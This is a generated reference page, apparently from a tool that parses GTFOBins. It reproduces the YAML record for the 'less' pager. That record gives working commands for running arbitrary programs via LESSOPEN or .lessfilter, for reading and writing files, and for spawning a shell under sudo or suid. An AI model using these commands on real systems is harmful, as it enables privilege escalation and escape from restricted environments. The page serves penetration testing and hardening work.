---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# less

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `less` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/less` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [less](../../tools/linux/less.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | less |
| name | less |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/less/ |

## Preserved Source Material

```yaml
_body: ''
_name: less
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/less
functions:
  command:
  - code: 'cp /path/to/command ~/.lessfilter

      less /etc/hosts'
    contexts:
      unprivileged: null
  - code: 'LESSOPEN=''/path/to/command # %s'' less /etc/hosts'
    contexts:
      sudo: null
      unprivileged: null
  file-read:
  - code: less /path/to/input-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  - code: 'less /etc/hosts

      :e /path/to/input-file'
    comment: This can be used to read another file, e.g., when invoked as a pager with some fixed content.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  - code: 'LESSOPEN=''echo /path/to/input-file # %s'' less /etc/hosts'
    comment: This can be used to read another file.
    contexts:
      sudo: null
      unprivileged: null
  file-write:
  - code: 'echo DATA | less

      s/path/to/output-file

      q'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  inherit:
  - code: 'less /etc/hosts

      v'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    from: vi
  shell:
  - code: 'less /etc/hosts

      !/bin/sh'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  - code: 'LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts

      reset'
    comment: The optional `reset` command is needed to receive the echo back of the typed keystrokes.
    contexts:
      sudo: null
      unprivileged: null
  - code: 'VISUAL=''/bin/sh -s --'' less /etc/hosts

      v'
    contexts:
      sudo: null
      unprivileged: null
```
